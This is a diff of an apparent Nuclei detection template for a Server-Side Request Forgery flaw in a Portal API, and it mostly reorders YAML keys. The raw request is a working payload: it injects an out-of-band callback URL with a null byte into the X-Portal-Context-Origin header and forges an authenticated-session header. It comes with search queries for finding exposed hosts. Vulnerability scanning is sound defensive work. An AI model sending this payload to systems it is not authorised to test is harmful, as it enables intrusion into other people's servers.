@@ -1,39 +1,43 @@
+http:
+- extractors:
+  - name: interaction_id
+    part: interactsh
+    regex:
+    - '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
+    type: regex
+  matchers:
+  - condition: and
+    dsl:
+    - contains(interactsh_protocol, "http")
+    - contains(interactsh_request, "/api/v3/portal")
+    type: dsl
+  raw:
+  - 'GET /_proxy/api/v3/portal HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
+
+    X-Portal-Session-Authenticated: true
+
+    '
 id: portal-api-ssrf
 info:
-  name: Portal API - Server Side Request Forgery
   author: ishowtess
-  severity: high
-  description: |
-    A Server-Side Request Forgery (SSRF) vulnerability in the Portal API endpoint by injecting a crafted X-Portal-Context-Origin header.
-  reference:
-    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
   classification:
     cwe-id:
-      - CWE-918
+    - CWE-918
+  description: 'A Server-Side Request Forgery (SSRF) vulnerability in the Portal API
+    endpoint by injecting a crafted X-Portal-Context-Origin header.
+
+    '
   metadata:
-    runzero-match: any(each(service["http.bodies"]), {# matches "/_proxy/api/v3/"})
     fofa-query: body="/_proxy/api/v3/"
     max-request: 1
+    runzero-match: service["http.body"] matches "/_proxy/api/v3/"
     verified: true
+  name: Portal API - Server Side Request Forgery
+  reference:
+  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+  severity: high
   tags: api,http,portal,ssrf,vuln
-http:
-  - extractors:
-      - name: interaction_id
-        part: interactsh
-        regex:
-          - '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
-        # digest: 4a0a0047304502210087773f22d6a4b049111a0cce2bfc706c45642c15c278c3c6334091664db1151c02205a40c27680ad1e4eab52f66b33b1cd03025285470a7fe44248e7700ed96333fd:922c64590222798bb761d5b6d8e72950
-
-        type: regex
-    matchers:
-      - condition: and
-        dsl:
-          - contains(interactsh_protocol, "http")
-          - contains(interactsh_request, "/api/v3/portal")
-        type: dsl
-    raw:
-      - |
-        GET /_proxy/api/v3/portal HTTP/1.1
-        Host: {{Hostname}}
-        X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00
-        X-Portal-Session-Authenticated: true
